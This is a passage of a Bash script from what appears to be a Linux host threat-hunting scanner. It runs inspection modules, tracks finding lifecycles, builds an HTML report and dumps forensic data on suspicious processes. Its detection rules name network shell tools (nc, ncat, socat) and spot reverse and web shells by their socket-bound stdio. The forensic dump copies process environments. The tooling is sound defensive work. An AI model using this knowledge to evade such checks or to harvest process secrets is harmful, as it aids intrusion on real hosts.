    local raw="runtime-snapshot-${phase}.jsonl" summary="runtime-snapshot-${phase}-summary.json"
    [ -f "${RAW_DIR}/${raw}" ] || : > "${RAW_DIR}/${raw}"
    [ -f "${RAW_DIR}/${summary}" ] || : > "${RAW_DIR}/${summary}"
    record_raw_status "$raw" "$status" "$source" "$detail"
    record_raw_status "$summary" "$status" "$source" "$detail"
}

validate_json_file() {
    local file="$1"
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$file" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as source:
    json.load(source)
PY
        return $?
    fi
    if command -v jq >/dev/null 2>&1; then
        jq empty "$file" >/dev/null
        return $?
    fi
    return 0
}

csv_json_array() {
    local csv="$1" value first=true
    local -a values=(); IFS=',' read -r -a values <<< "$csv"
    printf '['
    for value in "${values[@]}"; do [ -n "$value" ] || continue; [ "$first" = true ] || printf ','; first=false; json_quote "$value"; done
    printf ']'
}

context_field() {
    local context="$1" field="$2" value
    value=$(printf '%s' "$context" | sed -n "s/.*${field}=\([^;]*\).*/\1/p" | head -1)
    printf '%s' "${value:-none}"
}

lines_json_array() {
    local lines="$1" value first=true
    printf '['
    while IFS= read -r value || [ -n "$value" ]; do
        [ -n "$value" ] || continue
        [ "$first" = true ] || printf ','
        first=false
        json_quote "$value"
    done <<< "$lines"
    printf ']'
}

js_quote() {
    json_quote "$1" | sed 's/</\\u003c/g; s/>/\\u003e/g; s/\&/\\u0026/g'
}

html_esc() {
    local value="$1"
    value=${value//&/\&amp;}
    value=${value//</\&lt;}
    value=${value//>/\&gt;}
    value=${value//\"/\&quot;}
    printf '%s' "$value"
}

# 通过 NUL 分隔的数据流一次性替换全部占位符。动态内容不会成为 Perl 源码，
# 也不会因后续替换而被再次解释。
replace_html_tokens() {
    local html_file="$1"
    shift
    {
        while [ $# -ge 2 ]; do
            printf '%s\0%s\0' "$1" "$2"
            shift 2
        done
    } | perl -0pi -e '
        BEGIN {
            local $/;
            @parts = split(/\0/, <STDIN>, -1);
            for ($i=0; $i+1<@parts; $i+=2) { $replacement{$parts[$i]} = $parts[$i+1] }
        }
        s/(HOSTNAME_PLACEHOLDER|LOCAL_IPS_PLACEHOLDER|OS_PLACEHOLDER|KERNEL_PLACEHOLDER|TS_PLACEHOLDER|HOST_ROLE_PLACEHOLDER|PROFILE_PLACEHOLDER|COVERAGE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|STATE_PLACEHOLDER|AUTH_PROFILE_PLACEHOLDER|CONCLUSION_CLASS|CONCLUSION_TEXT|SCRIPT_VER|THREAT_STATS|THREAT_TABLE|ANOMALY_TABLE|BASELINE_STATS|BASELINE_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|YARA_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE|CHANGE_STATS|CHANGE_TABLE|ENDPOINT_TABLE|PRIORITY_TABLE|MODULE_TABLE|RAW_ROWS|ARCHIVE_ROWS|IOC_DATA_PLACEHOLDER)/$replacement{$1}/ge
    ' "$html_file"
}

web_shell_children() {
    ps -eo pid=,ppid=,comm=,args= 2>/dev/null | awk '
        { pid=$1; parent[pid]=$2; comm[pid]=$3; line[pid]=$0 }
        END {
            for (pid in line) {
                if (comm[pid] !~ /^(bash|sh|dash|zsh|ksh|python|python2|python3|perl|ruby|php|nc|ncat|netcat|socat)$/) continue
                p=parent[pid]
                for (depth=0; depth<5 && p>1; depth++) {
                    if (comm[p] ~ /^(nginx|apache2|httpd|php-fpm|php-fpm[0-9.]*|litespeed|caddy|uwsgi|gunicorn|tomcat|java|node)$/) {
                        print line[pid] " | web_ancestor=" p ":" comm[p]
                        break
                    }
                    p=parent[p]
                }
            }
        }'
}

# Shell/解释器的标准输入输出直接指向 socket，是比端口号和命令行关键字更强的
# 反弹 Shell 证据。SSH 正常交互会使用 pty，通常不会命中本规则。
shell_socket_stdio() {
    local status pid comm exe fd0 fd1 fd2 sockets conn ppid parent
    for status in /proc/[0-9]*/status; do
        [ -r "$status" ] || continue
        pid="${status#/proc/}"; pid="${pid%/status}"
        comm=$(awk '/^Name:/ {print $2; exit}' "$status" 2>/dev/null)
        case "$comm" in
            bash|sh|dash|zsh|ksh|python|python2|python3|perl|ruby|php|nc|ncat|netcat|socat) ;;
            *) continue ;;
        esac
        exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || true)
        is_whitelisted_path "$exe" && continue
        fd0=$(readlink "/proc/${pid}/fd/0" 2>/dev/null || true)
        fd1=$(readlink "/proc/${pid}/fd/1" 2>/dev/null || true)
        fd2=$(readlink "/proc/${pid}/fd/2" 2>/dev/null || true)
        sockets=$(printf '%s\n%s\n%s\n' "$fd0" "$fd1" "$fd2" | grep -E '^socket:\[[0-9]+\]$' | sort -u)
        [ -n "$sockets" ] || continue
        conn=$(socket_snapshot all | grep -E "pid=${pid}," | head -3)
        [ -n "$conn" ] || continue
        ppid=$(awk '/^PPid:/ {print $2; exit}' "$status" 2>/dev/null)
        parent=$(cat "/proc/${ppid}/comm" 2>/dev/null || echo unknown)
        printf 'PID=%s PPID=%s(%s) comm=%s exe=%s fd0=%s fd1=%s fd2=%s connection=%s\n' \
            "$pid" "${ppid:-unknown}" "$parent" "$comm" "${exe:-unknown}" "$fd0" "$fd1" "$fd2" \
            "$(printf '%s' "$conn" | tr '\n' ';')"
    done
}

module_requirements() {
    case "$1" in
        system) echo "uname hostname df free ip" ;;
        users) echo "awk grep last who" ;;
        process) echo "ps readlink find" ;;
        network) echo "ss ip" ;;
        rootkit) echo "awk strings readelf" ;;
        persistence) echo "crontab systemctl grep" ;;
        filesystem) echo "find stat grep file" ;;
        history) echo "grep find" ;;
        services) echo "systemctl" ;;
        logs) echo "last lastb dmesg" ;;
        memory) echo "grep free" ;;
        baseline) echo "grep" ;;
    esac
}

module_source_plan() {
    case "$1" in
        system) echo "procfs,os-release,filesystem,network-addresses" ;;
        users) echo "passwd-shadow,ssh-config,auth-log,login-history,audit-auth" ;;
        process) echo "procfs-processes,process-tree,proc-maps,package-integrity,resource-baseline" ;;
        network) echo "socket-snapshot,routing,dns,process-socket-map,beacon-history" ;;
        rootkit) echo "kernel-modules,procfs-cross-check,ld-preload,package-integrity,ima" ;;
        persistence) echo "cron,systemd,ssh-keys,shell-profiles,loader-config" ;;
        filesystem) echo "bounded-file-snapshot,file-hashes,file-type,package-owner,yara" ;;
        history) echo "shell-history,environment,temp-artifacts" ;;
        services) echo "systemd-services,package-inventory,patch-posture,web-runtime-baseline" ;;
        logs) echo "auth-log,auditd,journald-audit,falco,system-log,web-access-log" ;;
        memory) echo "proc-maps,memfd,rwx-mappings,ptrace-events,memory-pressure" ;;
        baseline) echo "ssh-policy,password-policy,mac-policy,firewall,time-sync" ;;
    esac
}

module_source_runtime_status() {
    local source="$1"
    case "$source" in
        socket-snapshot) case "$SOCKET_SNAPSHOT_STATUS" in AVAILABLE|PARTIAL) echo SUCCESS ;; *) echo UNAVAILABLE ;; esac ;;
        audit-auth|auditd) [ "$EVENT_SOURCE_AUDITD" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
        falco) [ "$EVENT_SOURCE_FALCO" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
        yara) [ "$EVENT_SOURCE_YARA" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
        ima) [ "$EVENT_SOURCE_IMA" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
        web-access-log) case "$WEB_ACCESS_LOG_STATUS" in AVAILABLE|PARTIAL) echo SUCCESS ;; *) echo UNAVAILABLE ;; esac ;;
        beacon-history) [ "$STATE_ENABLED" = true ] && echo SUCCESS || echo UNAVAILABLE ;;
        resource-baseline) [ "$STATE_ENABLED" = true ] && echo SUCCESS || echo UNAVAILABLE ;;
        web-runtime-baseline) [ "$HOST_ROLE" = web-server ] && echo SUCCESS || echo NOT_APPLICABLE ;;
        *) echo SUCCESS ;;
    esac
}

mark_current_module_partial() {
    local reason="$1"
    case ",${CURRENT_MODULE_WARNINGS}," in
        *,"$reason",*) ;;
        *) CURRENT_MODULE_WARNINGS="${CURRENT_MODULE_WARNINGS}${CURRENT_MODULE_WARNINGS:+,}${reason}" ;;
    esac
}

write_stage_checkpoint() {
    local stage="$1" status="$2" detail="${3:-}" file="${STATE_DIR}/stage-checkpoint.json" pending="${STATE_DIR}/.stage-checkpoint.${RUN_ID}.tmp"
    [ "$STATE_ENABLED" = true ] || return 0
    [ -d "$STATE_DIR" ] || return 0
    printf '{"schema_version":1,"run_id":%s,"profile":%s,"stage":%s,"status":%s,"updated_at":%s,"detail":%s}\n' \
        "$(json_quote "$RUN_ID")" "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$stage")" "$(json_quote "$status")" "$(json_quote "$(date -u +%Y-%m-%dT%H:%M:%SZ)")" "$(json_quote "$detail")" > "$pending" || return 1
    chmod 600 "$pending" && mv -f -- "$pending" "$file"
}

run_module() {
    local module_id="$1" module_name="$2" fn="$3"
    local start end rc=0 status="SUCCESS" missing="" cmd raw_log progress_detail planned successful="" no_result="" unavailable="" failed="" source coverage=0 source_total=0 source_success=0 source_state
    local saved_red="$RED" saved_green="$GREEN" saved_yellow="$YELLOW" saved_blue="$BLUE" saved_magenta="$MAGENTA" saved_cyan="$CYAN" saved_bold="$BOLD" saved_dim="$DIM" saved_nc="$NC"
    start=$(date +%s)
    CURRENT_MODULE="$module_id"
    write_stage_checkpoint "$module_id" RUNNING "module_started" || true
    CURRENT_MODULE_WARNINGS=""
    progress_bar "$MODULE_COMPLETED" "$MODULE_TOTAL" "$module_name" RUNNING "正在检查"
    raw_log="${RAW_DIR:-.}/module-${module_id}.log"
    : > "$raw_log" 2>/dev/null || raw_log="/dev/null"
    for cmd in $(module_requirements "$module_id"); do
        command -v "$cmd" >/dev/null 2>&1 || missing="${missing}${missing:+,}${cmd}"
    done
    # 文件日志保持纯文本；颜色只用于交互式进度面板。
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''; CYAN=''; BOLD=''; DIM=''; NC=''
    "$fn" >>"$raw_log" 2>&1 || rc=$?
    RED="$saved_red"; GREEN="$saved_green"; YELLOW="$saved_yellow"; BLUE="$saved_blue"; MAGENTA="$saved_magenta"; CYAN="$saved_cyan"; BOLD="$saved_bold"; DIM="$saved_dim"; NC="$saved_nc"
    [ "$raw_log" = "/dev/null" ] || chmod 600 "$raw_log" 2>/dev/null || true
    end=$(date +%s)
    if [ "$rc" -ne 0 ]; then
        status="FAILED"
    elif [ -n "$missing" ] || [ -n "$CURRENT_MODULE_WARNINGS" ]; then
        status="PARTIAL"
    fi
    MODULE_IDS+=("$module_id")
    MODULE_NAMES+=("$module_name")
    MODULE_STATUSES+=("$status")
    MODULE_DURATIONS+=("$((end - start))")
    local error=""
    [ -n "$missing" ] && error="missing:${missing}"
    [ -n "$CURRENT_MODULE_WARNINGS" ] && error="${error}${error:+; }partial:${CURRENT_MODULE_WARNINGS}"
    [ "$rc" -ne 0 ] && error="${error}${error:+; }exit:${rc}"
    MODULE_ERRORS+=("$error")
    planned=$(module_source_plan "$module_id")
    IFS=',' read -r -a _planned_sources <<< "$planned"
    for source in "${_planned_sources[@]}"; do
        [ -n "$source" ] || continue
        source_total=$((source_total + 1)); source_state=$(module_source_runtime_status "$source")
        case "$source_state" in
            SUCCESS) successful="${successful}${successful:+,}${source}"; source_success=$((source_success + 1)) ;;
            NO_RESULTS) no_result="${no_result}${no_result:+,}${source}"; source_success=$((source_success + 1)) ;;
            NOT_APPLICABLE) no_result="${no_result}${no_result:+,}${source}"; source_success=$((source_success + 1)) ;;
            FAILED) failed="${failed}${failed:+,}${source}" ;;
            *) unavailable="${unavailable}${unavailable:+,}${source}" ;;
        esac
    done
    [ "$source_total" -eq 0 ] || coverage=$((source_success * 100 / source_total))
    [ "$rc" -eq 0 ] || { failed="${failed}${failed:+,}module-execution"; coverage=0; }
    MODULE_PLANNED_SOURCES+=("$planned"); MODULE_SUCCESSFUL_SOURCES+=("$successful")
    MODULE_NO_RESULT_SOURCES+=("$no_result"); MODULE_UNAVAILABLE_SOURCES+=("$unavailable")
    MODULE_FAILED_SOURCES+=("$failed"); MODULE_MISSING_SOURCES+=("${unavailable}${failed:+,}${failed}")
    MODULE_COVERAGES+=("$coverage")
    MODULE_COMPLETED=$((MODULE_COMPLETED + 1))
    write_stage_checkpoint "$module_id" "$status" "module_finished" || true
    calculate_coverage
    recalculate_severity_counts
    case "$status" in
        SUCCESS) progress_detail="检查成功" ;;
        PARTIAL) progress_detail="部分依赖缺失或检查失败" ;;
        FAILED) progress_detail="模块执行失败，继续后续检查" ;;
        *) progress_detail="检查完成" ;;
    esac
    progress_bar "$MODULE_COMPLETED" "$MODULE_TOTAL" "$module_name" "$status" "$progress_detail"
    CURRENT_MODULE="bootstrap"
    CURRENT_MODULE_WARNINGS=""
}

get_module_status() {
    local wanted="$1" idx
    for idx in "${!MODULE_IDS[@]}"; do
        [ "${MODULE_IDS[$idx]}" = "$wanted" ] && { printf '%s' "${MODULE_STATUSES[$idx]}"; return; }
    done
    printf 'UNKNOWN'
}

modules_successful() {
    local modules="$1" module
    local -a _source_modules=()
    IFS=',' read -r -a _source_modules <<< "$modules"
    for module in "${_source_modules[@]}"; do
        [ "$(get_module_status "$module")" = "SUCCESS" ] || return 1
    done
    return 0
}

calculate_coverage() {
    local idx score=0 total=${#MODULE_COVERAGES[@]} available=0 planned=0 source
    [ "$total" -eq 0 ] && { RUN_COVERAGE=0; return; }
    for idx in "${!MODULE_COVERAGES[@]}"; do score=$((score + ${MODULE_COVERAGES[$idx]:-0})); done
    RUN_COVERAGE=$((score / total))
    for idx in "${!MODULE_PLANNED_SOURCES[@]}"; do
        IFS=',' read -r -a _coverage_planned <<< "${MODULE_PLANNED_SOURCES[$idx]}"; planned=$((planned + ${#_coverage_planned[@]}))
        IFS=',' read -r -a _coverage_available <<< "${MODULE_SUCCESSFUL_SOURCES[$idx]}${MODULE_NO_RESULT_SOURCES[$idx]:+,}${MODULE_NO_RESULT_SOURCES[$idx]}"; available=$((available + ${#_coverage_available[@]}))
    done
    [ "$planned" -eq 0 ] && SOURCE_AVAILABILITY_PERCENT=0 || SOURCE_AVAILABILITY_PERCENT=$((available * 100 / planned))
    if [ "$SOURCE_AVAILABILITY_PERCENT" -ge 85 ]; then TELEMETRY_STATUS="HEALTHY"; TELEMETRY_EXPLANATION="主要狩猎数据源可用"; elif [ "$SOURCE_AVAILABILITY_PERCENT" -ge 50 ]; then TELEMETRY_STATUS="PARTIAL"; TELEMETRY_EXPLANATION="部分增强数据源缺失，快照检测继续运行"; else TELEMETRY_STATUS="DEGRADED"; TELEMETRY_EXPLANATION="关键狩猎数据源缺失，未形成规则证据不代表确认安全"; fi
}

state_header() {
    printf '#secscope-state-v%s|%s|%s' "$STATE_SCHEMA_VERSION" "$HOST_ID" "$RULE_VERSION"
}

append_state_event() {
    local event="$1" fp="$2" rule_id="$3" severity="$4" summary="$5"
    printf '{"time":%s,"run_id":%s,"host_id":%s,"event":%s,"fingerprint":%s,"rule_id":%s,"severity":%s,"summary":%s}\n' \
        "$(json_quote "$RUN_STARTED_AT")" "$(json_quote "$RUN_ID")" "$(json_quote "$HOST_ID")" \
        "$(json_quote "$event")" "$(json_quote "$fp")" "$(json_quote "$rule_id")" \
        "$(json_quote "$severity")" "$(json_quote "$summary")" >> "${EVENTS_COMMIT_PENDING:-$EVENTS_FILE}"
}

prepare_state_store() {
    [ "$STATE_ENABLED" = true ] || { STATE_HEALTH="DISABLED"; return 0; }
    if ! mkdir -p "$STATE_DIR" || ! chmod 700 "$STATE_DIR"; then
        log_error "无法创建状态目录: $STATE_DIR"
        STATE_HEALTH="FAILED"
        return 1
    fi
    if [ -r "${STATE_DIR}/stage-checkpoint.json" ] && command -v python3 >/dev/null 2>&1; then
        if python3 - "${STATE_DIR}/stage-checkpoint.json" <<'PY'
import json
import sys
try:
    data = json.load(open(sys.argv[1], encoding="utf-8"))
    raise SystemExit(0 if data.get("status") == "RUNNING" else 1)
except (OSError, ValueError, TypeError):
    raise SystemExit(1)
PY
        then
            RECOVERY_NOTICE="检测到上次扫描在阶段 $(python3 -c 'import json,sys; print(json.load(open(sys.argv[1],encoding="utf-8")).get("stage","unknown"))' "${STATE_DIR}/stage-checkpoint.json" 2>/dev/null || printf unknown) 中断；本轮将使用已提交基线继续"
            log_warn "$RECOVERY_NOTICE"
        fi
    fi
    HOST_ID="$(cat /etc/machine-id 2>/dev/null | tr -d '\n\r')"
    [ -n "$HOST_ID" ] || HOST_ID=$(sha256_text "${HOSTNAME}|$(uname -m 2>/dev/null)")
    STATE_FILE="${STATE_DIR}/active.state"
    EVENTS_FILE="${STATE_DIR}/events.jsonl"
    EVENTS_COMMIT_PENDING="${STATE_DIR}/.events.pending.${RUN_ID}"
    : > "$EVENTS_COMMIT_PENDING" || return 1
    AUTH_PROFILE_FILE="${STATE_DIR}/auth_profiles.state"
    AUTH_SEEN_FILE="${STATE_DIR}/auth_events.seen"
    touch "$EVENTS_FILE" || return 1
    chmod 600 "$EVENTS_FILE"

    if [ "$RESET_STATE" = true ]; then
        if [ -f "$STATE_FILE" ]; then
            mv "$STATE_FILE" "${STATE_DIR}/active.state.reset_${TIMESTAMP}"
        fi
        [ ! -f "$AUTH_PROFILE_FILE" ] || mv "$AUTH_PROFILE_FILE" "${STATE_DIR}/auth_profiles.state.reset_${TIMESTAMP}"
        [ ! -f "${AUTH_PROFILE_FILE}.bak" ] || mv "${AUTH_PROFILE_FILE}.bak" "${STATE_DIR}/auth_profiles.state.bak.reset_${TIMESTAMP}"
        [ ! -f "$AUTH_SEEN_FILE" ] || mv "$AUTH_SEEN_FILE" "${STATE_DIR}/auth_events.seen.reset_${TIMESTAMP}"
        local inventory_state
        for inventory_state in "${STATE_DIR}"/file_inventory.state "${STATE_DIR}"/file_inventory.state.bak "${STATE_DIR}"/file_inventory.fast-hunt.state "${STATE_DIR}"/file_inventory.fast-hunt.state.bak "${STATE_DIR}"/file_inventory.daily-hunt.state "${STATE_DIR}"/file_inventory.daily-hunt.state.bak "${STATE_DIR}"/file_inventory.full.state "${STATE_DIR}"/file_inventory.full.state.bak; do
            [ ! -f "$inventory_state" ] || mv "$inventory_state" "${inventory_state}.reset_${TIMESTAMP}"
        done
        [ ! -f "${STATE_DIR}/connection-baseline.state" ] || mv "${STATE_DIR}/connection-baseline.state" "${STATE_DIR}/connection-baseline.state.reset_${TIMESTAMP}"
        STATE_HEALTH="RESET"
        INIT_STATE=true
    fi
    if [ "$INIT_STATE" = true ] && [ -s "$STATE_FILE" ]; then
        log_error "状态已经存在，拒绝重复初始化；使用 --reset-state 明确重置"
        return 1
    fi

    if [ -s "$STATE_FILE" ]; then
        local header expected_prefix stored_host
        header=$(head -1 "$STATE_FILE")
        expected_prefix="#secscope-state-v${STATE_SCHEMA_VERSION}|"
        stored_host=$(printf '%s' "$header" | awk -F'|' '{print $2}')
        if [[ "$header" == "#secscope-state-v1|${HOST_ID}|"* || "$header" == "#secscope-state-v2|${HOST_ID}|"* ]]; then
            STATE_HEALTH="UPGRADED"
        elif [[ "$header" != "$expected_prefix"* ]] || [ "$stored_host" != "$HOST_ID" ]; then
            if [ -s "${STATE_FILE}.bak" ] && [[ "$(head -1 "${STATE_FILE}.bak")" == "$expected_prefix${HOST_ID}|"* ]]; then
                cp "${STATE_FILE}.bak" "$STATE_FILE"
                STATE_HEALTH="RECOVERED_BACKUP"
            else
                mv "$STATE_FILE" "${STATE_DIR}/active.state.corrupt_${TIMESTAMP}"
                STATE_HEALTH="STATE_RESET"
            fi
        else
            STATE_HEALTH="OK"
        fi
    else
        STATE_HEALTH="NEW"
    fi
    return 0
}

increment_lifecycle_count() {
    case "$1" in
        NEW) LIFECYCLE_NEW=$((LIFECYCLE_NEW + 1)) ;;
        CHANGED) LIFECYCLE_CHANGED=$((LIFECYCLE_CHANGED + 1)) ;;
        ESCALATED) LIFECYCLE_ESCALATED=$((LIFECYCLE_ESCALATED + 1)) ;;
        DEESCALATED) LIFECYCLE_DEESCALATED=$((LIFECYCLE_DEESCALATED + 1)) ;;
        REOPENED) LIFECYCLE_REOPENED=$((LIFECYCLE_REOPENED + 1)) ;;
        ONGOING) LIFECYCLE_ONGOING=$((LIFECYCLE_ONGOING + 1)) ;;
        BASELINE_EXISTING) LIFECYCLE_BASELINE=$((LIFECYCLE_BASELINE + 1)) ;;
        RESOLVED) LIFECYCLE_RESOLVED=$((LIFECYCLE_RESOLVED + 1)) ;;
    esac
}

reconcile_state() {
    recalculate_severity_counts
    LIFECYCLE_NEW=0; LIFECYCLE_CHANGED=0; LIFECYCLE_ESCALATED=0; LIFECYCLE_DEESCALATED=0
    LIFECYCLE_REOPENED=0; LIFECYCLE_ONGOING=0; LIFECYCLE_BASELINE=0; LIFECYCLE_RESOLVED=0
    [ "$STATE_ENABLED" = true ] || {
        local idx
        for idx in "${!FINDINGS[@]}"; do FINDING_LIFECYCLES[$idx]="UNTRACKED"; done
        return 0
    }

    local previous_exists=false next_file current_file idx prior lifecycle
    [ -s "$STATE_FILE" ] && previous_exists=true
    next_file=$(mktemp "${STATE_DIR}/.active.next.XXXXXX") || return 1
    current_file=$(mktemp "${STATE_DIR}/.current.XXXXXX") || return 1
    state_header > "$next_file"
    printf '\n' >> "$next_file"

    for idx in "${!FINDINGS[@]}"; do
        local fp="${FINDING_FINGERPRINTS[$idx]}" rule_id="${FINDING_RULE_IDS[$idx]}"
        local module="${FINDING_MODULES[$idx]}" category="${FINDING_CATS[$idx]}" sev="${FINDING_SEVS[$idx]}"
        local evidence_hash="${FINDING_EVIDENCE_HASHES[$idx]}" summary="${FINDING_SUMMARIES[$idx]}"
        local entity="${FINDING_ENTITY_KEYS[$idx]}" first_seen="$RUN_STARTED_AT" occurrences=1
        prior=""
        [ "$previous_exists" = true ] && prior=$(awk -F'|' -v fp="$fp" '$1==fp {print; exit}' "$STATE_FILE")
        if [ -z "$prior" ]; then
            if [ "$INIT_STATE" = true ]; then lifecycle="BASELINE_EXISTING"; else lifecycle="NEW"; fi
        else
            local p_fp p_rule p_module p_cat p_sev p_first p_last p_count p_missing p_ehash p_status p_summary p_entity
            IFS='|' read -r p_fp p_rule p_module p_cat p_sev p_first p_last p_count p_missing p_ehash p_status p_summary p_entity <<< "$prior"
            first_seen="$p_first"; occurrences=$((p_count + 1))
            if [ "$p_status" = "RESOLVED" ]; then
                lifecycle="REOPENED"
            elif [ "$(severity_rank "$sev")" -gt "$(severity_rank "$p_sev")" ]; then
                lifecycle="ESCALATED"
            elif [ "$(severity_rank "$sev")" -lt "$(severity_rank "$p_sev")" ]; then
                lifecycle="DEESCALATED"
            elif [ "$evidence_hash" != "$p_ehash" ]; then
                lifecycle="CHANGED"
            else
                lifecycle="ONGOING"
            fi
        fi
        FINDING_LIFECYCLES[$idx]="$lifecycle"
        FINDING_FIRST_SEEN[$idx]="$first_seen"
        FINDING_LAST_SEEN[$idx]="$RUN_STARTED_AT"
        FINDING_OCCURRENCES[$idx]="$occurrences"
        increment_lifecycle_count "$lifecycle"
        printf '%s\n' "$fp" >> "$current_file"
        printf '%s|%s|%s|%s|%s|%s|%s|%s|0|%s|%s|%s|%s\n' \
            "$fp" "$rule_id" "$module" "$category" "$sev" "$first_seen" "$RUN_STARTED_AT" "$occurrences" \
            "$evidence_hash" "$lifecycle" "$(base64_one_line "$summary")" "$(base64_one_line "$entity")" >> "$next_file"
        [ "$lifecycle" != "ONGOING" ] && append_state_event "$lifecycle" "$fp" "$rule_id" "$sev" "$summary"
    done

    if [ "$previous_exists" = true ]; then
        while IFS='|' read -r p_fp p_rule p_module p_cat p_sev p_first p_last p_count p_missing p_ehash p_status p_summary p_entity; do
            [[ "$p_fp" == \#* || -z "$p_fp" ]] && continue
            grep -qxF "$p_fp" "$current_file" && continue
            local missing="$p_missing" status="$p_status" decoded_summary
            if modules_successful "$p_module"; then
                missing=$((missing + 1))
                if [ "$missing" -ge "$RESOLVE_AFTER_MISSES" ]; then
                    status="RESOLVED"
                    if [ "$p_status" != "RESOLVED" ]; then
                        decoded_summary=$(base64_decode_text "$p_summary")
                        RESOLVED_FPS+=("$p_fp"); RESOLVED_RULE_IDS+=("$p_rule"); RESOLVED_SEVS+=("$p_sev")
                        RESOLVED_CATS+=("$p_cat"); RESOLVED_SUMMARIES+=("$decoded_summary")
                        RESOLVED_FIRST_SEEN+=("$p_first"); RESOLVED_LAST_SEEN+=("$p_last")
                        increment_lifecycle_count "RESOLVED"
                        append_state_event "RESOLVED" "$p_fp" "$p_rule" "$p_sev" "$decoded_summary"
                    fi
                fi
            fi
            printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
                "$p_fp" "$p_rule" "$p_module" "$p_cat" "$p_sev" "$p_first" "$p_last" "$p_count" \
                "$missing" "$p_ehash" "$status" "$p_summary" "$p_entity" >> "$next_file"
        done < "$STATE_FILE"
    fi

    chmod 600 "$next_file"
    STATE_COMMIT_PENDING="${STATE_DIR}/.active.pending.${RUN_ID}"
    mv "$next_file" "$STATE_COMMIT_PENDING"
    chmod 600 "$STATE_COMMIT_PENDING"
    rm -f "$current_file"
    [ "$STATE_HEALTH" = "NEW" ] && STATE_HEALTH="INITIALIZED"
    return 0
}

commit_alert_state() {
    [ "$STATE_ENABLED" = true ] || return 0
    [ -s "$STATE_COMMIT_PENDING" ] || return 1
    [ ! -s "$STATE_FILE" ] || cp "$STATE_FILE" "${STATE_FILE}.bak"
    mv "$STATE_COMMIT_PENDING" "$STATE_FILE" || return 1
    [ -z "$LAST_STATUS_PENDING" ] || mv "$LAST_STATUS_PENDING" "${STATE_DIR}/last-status.json" || return 1
    [ ! -s "$EVENTS_COMMIT_PENDING" ] || cat "$EVENTS_COMMIT_PENDING" >> "$EVENTS_FILE"
    rm -f "$EVENTS_COMMIT_PENDING"
    printf '%s\n' "$RUN_STARTED_AT" > "${STATE_DIR}/last-run"
    chmod 600 "$STATE_FILE" "$EVENTS_FILE" "${STATE_DIR}/last-run" "${STATE_FILE}.bak" 2>/dev/null || true
}

record_raw_status() {
    local path="$1" status="$2" source="$3" error="$4" idx
    for idx in "${!RAW_PATHS[@]}"; do
        [ "${RAW_PATHS[$idx]}" = "$path" ] || continue
        RAW_STATUSES[$idx]="$status"; RAW_SOURCES[$idx]="$source"; RAW_ERRORS[$idx]="$error"
        return 0
    done
    RAW_PATHS+=("$path"); RAW_STATUSES+=("$status"); RAW_SOURCES+=("$source"); RAW_ERRORS+=("$error")
}

# 保存原始数据到 raw/ 目录，用于二次研判交叉验证
dump_raw() {
    local name="$1"; shift
    local rawfile="${RAW_DIR}/${name}" rc=0 source="${CURRENT_MODULE:-unknown}" status="SUCCESS" error=""
    mkdir -p "$(dirname "$rawfile")" 2>/dev/null || return 1
    chmod 700 "$(dirname "$rawfile")" 2>/dev/null || true
    if [ $# -eq 0 ]; then
        # 从 stdin 读取
        cat > "$rawfile" 2>/dev/null
    else
        # 执行命令并保存输出（命令执行失败也记录）
        "$@" > "$rawfile" 2>&1 || rc=$?
        if [ "$rc" -ne 0 ]; then
            echo "[exit: $rc]" >> "$rawfile"
            mark_current_module_partial "raw_${name}_exit_${rc}"
            status="FAILED"; error="exit:${rc}"
        fi
    fi
    # 保留 0 字节文件，并在结构化清单中区分“无结果”和采集失败。
    if [ -s "$rawfile" ]; then
        chmod 600 "$rawfile" 2>/dev/null || true
    else
        : > "$rawfile"
        chmod 600 "$rawfile" 2>/dev/null || true
        [ "$status" = "SUCCESS" ] && status="NO_RESULTS"
    fi
    record_raw_status "$name" "$status" "$source" "$error"
}

# 保存可疑进程的完整取证数据
dump_suspicious_proc() {
    local pid="$1" label="$2"
    local pdir="${RAW_DIR}/proc/${pid}_${label}"
    mkdir -p "$pdir" 2>/dev/null
    chmod 700 "${RAW_DIR}/proc" "$pdir" 2>/dev/null || true
    readlink "/proc/${pid}/exe" > "${pdir}/exe_link" 2>/dev/null
    readlink "/proc/${pid}/cwd" > "${pdir}/cwd_link" 2>/dev/null
    tr '\0' '\n' < "/proc/${pid}/environ" > "${pdir}/environ" 2>/dev/null
    tr '\0' ' '  < "/proc/${pid}/cmdline" > "${pdir}/cmdline" 2>/dev/null; echo "" >> "${pdir}/cmdline"
    cp "/proc/${pid}/status" "${pdir}/status" 2>/dev/null
    cp "/proc/${pid}/cgroup" "${pdir}/cgroup" 2>/dev/null
    cp "/proc/${pid}/mountinfo" "${pdir}/mountinfo" 2>/dev/null
    ls -l "/proc/${pid}/fd" > "${pdir}/fd_list" 2>/dev/null
    ls -l "/proc/${pid}/ns" > "${pdir}/namespaces" 2>/dev/null
    {
        printf 'stdin='; readlink "/proc/${pid}/fd/0" 2>/dev/null || true
        printf 'stdout='; readlink "/proc/${pid}/fd/1" 2>/dev/null || true
        printf 'stderr='; readlink "/proc/${pid}/fd/2" 2>/dev/null || true
        socket_snapshot all | grep -E "pid=${pid}," | head -20
    } > "${pdir}/stdio_network" 2>/dev/null
    grep -E '^((Sig|Cap|Name|State|Pid|PPid|Uid|Vm|Threads):|[a-f0-9].*\.so)' "/proc/${pid}/maps" 2>/dev/null | head -100 > "${pdir}/maps_head100" 2>/dev/null
    # 标记是否为空
    [ -s "${pdir}/environ" ] || rm -f "${pdir}/environ"
    [ -s "${pdir}/cmdline" ] || rm -f "${pdir}/cmdline"
    [ -s "${pdir}/status" ]  || rm -f "${pdir}/status"
